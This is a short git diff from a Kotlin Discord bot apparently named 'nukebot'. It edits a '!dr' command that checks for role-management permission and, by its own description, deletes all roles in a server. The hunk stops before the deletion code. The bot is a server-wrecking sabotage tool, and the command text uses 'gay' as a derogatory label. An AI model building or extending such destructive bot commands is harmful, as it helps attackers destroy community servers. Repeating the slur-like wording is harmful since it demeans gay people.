@@ -5,13 +5,11 @@ import net.dv8tion.jda.api.events.message.MessageReceivedEvent
 import thenano.nukebot.bot.command.CommandListener
 import thenano.nukebot.bot.command.CommandManager
 
-@CommandListener.Info("!dr","elete All gay role in this server",false)
+@CommandListener.Info("!dr","delete All gay role in this server",false)
 class DeleteRole : CommandListener() {
 
-    @Throws(RuntimeException::class)
-    override fun onMessageReceived(event: MessageReceivedEvent) {
-        if (onInit(event)) return
 
+    override fun onEvent(event: MessageReceivedEvent) {
         if (messageRaw.startsWith("!dr")) {
             if (self.hasPermission(Permission.MANAGE_ROLES)) {
                 try {
